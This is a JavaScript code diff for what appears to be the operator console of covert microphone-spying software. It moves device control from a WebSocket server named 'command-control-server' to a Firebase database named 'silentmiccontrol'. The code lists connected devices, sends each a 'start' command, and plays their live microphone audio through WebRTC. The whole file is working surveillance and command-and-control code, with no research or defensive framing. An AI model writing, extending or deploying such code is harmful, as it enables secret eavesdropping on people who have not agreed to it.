@@ -1,77 +1,72 @@
-const socket = new WebSocket("wss://command-control-server.onrender.com");
-let pc = null;
-let currentDeviceId = null;
+const firebaseConfig = {
+  databaseURL: "https://silentmiccontrol-default-rtdb.firebaseio.com"
+};
 
-function createPeerConnection() {
-    pc = new RTCPeerConnection();
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 
-    pc.ontrack = (event) => {
-        const audio = document.getElementById("remoteAudio");
-        audio.srcObject = event.streams[0];
-        audio.style.display = "block";
-        document.getElementById("connectedStatus").textContent = `🎙️ Listening to ${currentDeviceId}`;
-    };
+const deviceListDiv = document.getElementById("deviceList");
 
-    pc.onicecandidate = (event) => {
-        if (event.candidate) {
-            socket.send(JSON.stringify({
-                type: "candidate",
-                candidate: event.candidate,
-                deviceId: currentDeviceId
-            }));
-        }
-    };
+db.ref("devices").once("value").then(snapshot => {
+  const devices = snapshot.val();
+  deviceListDiv.innerHTML = "";
+
+  if (!devices) {
+    deviceListDiv.textContent = "No devices online.";
+    return;
+  }
+
+  Object.keys(devices).forEach(deviceId => {
+    const info = devices[deviceId].info || {};
+    const btn = document.createElement("button");
+    btn.textContent = `▶️ Listen to ${deviceId}`;
+    btn.onclick = () => listenToDevice(deviceId);
+    deviceListDiv.appendChild(btn);
+  });
+});
+
+function listenToDevice(deviceId) {
+  deviceListDiv.innerHTML = `Connecting to <b>${deviceId}</b>...`;
+
+  const liveRef = db.ref(`live_audio/${deviceId}`);
+  liveRef.child("command").set("start");
+
+  const peer = new SimplePeer({ initiator: false, trickle: false });
+
+  peer.on("signal", data => {
+    liveRef.child("webrtc/answer").set({
+      type: data.type,
+      description: data.sdp
+    });
+  });
+
+  liveRef.child("webrtc/offer").on("value", snapshot => {
+    const offer = snapshot.val();
+    if (offer && offer.type && offer.description) {
+      peer.signal({ type: offer.type, sdp: offer.description });
+    }
+  });
+
+  liveRef.child("webrtc/candidate").on("child_added", snap => {
+    const candidate = snap.val();
+    if (candidate) {
+      peer.signal({
+        candidate: candidate.sdp,
+        sdpMid: candidate.sdpMid,
+        sdpMLineIndex: candidate.sdpMLineIndex
+      });
+    }
+  });
+
+  peer.on("stream", stream => {
+    const audio = new Audio();
+    audio.srcObject = stream;
+    audio.play();
+    deviceListDiv.innerHTML = `<b>✅ Now listening to ${deviceId}</b>`;
+  });
+
+  peer.on("error", err => {
+    console.error("Peer error", err);
+    deviceListDiv.innerHTML = `<b>❌ Error connecting to ${deviceId}</b>`;
+  });
 }
-
-socket.onopen = () => {
-    console.log("✅ WebSocket connected");
-    socket.send(JSON.stringify({ type: "get_devices" }));
-};
-
-socket.onmessage = async (event) => {
-    const data = JSON.parse(event.data);
-
-    if (data.type === "device_list") {
-        const list = document.getElementById("deviceList");
-        list.innerHTML = "";
-        data.devices.forEach(deviceId => {
-            const div = document.createElement("div");
-            div.className = "device";
-
-            const nameSpan = document.createElement("span");
-            nameSpan.textContent = deviceId;
-
-            const button = document.createElement("button");
-            button.textContent = "Listen";
-            button.onclick = () => {
-                currentDeviceId = deviceId;
-                socket.send(JSON.stringify({ type: "join", role: "listener", deviceId }));
-                document.getElementById("connectedStatus").textContent = `🔄 Connecting to ${deviceId}...`;
-            };
-
-            div.appendChild(nameSpan);
-            div.appendChild(button);
-            list.appendChild(div);
-        });
-    }
-
-    if (data.type === "offer") {
-        createPeerConnection();
-        await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
-        const answer = await pc.createAnswer();
-        await pc.setLocalDescription(answer);
-        socket.send(JSON.stringify({
-            type: "answer",
-            answer: pc.localDescription,
-            deviceId: currentDeviceId
-        }));
-    }
-
-    if (data.type === "candidate" && pc) {
-        try {
-            await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
-        } catch (e) {
-            console.error("Failed to add ICE candidate:", e);
-        }
-    }
-};
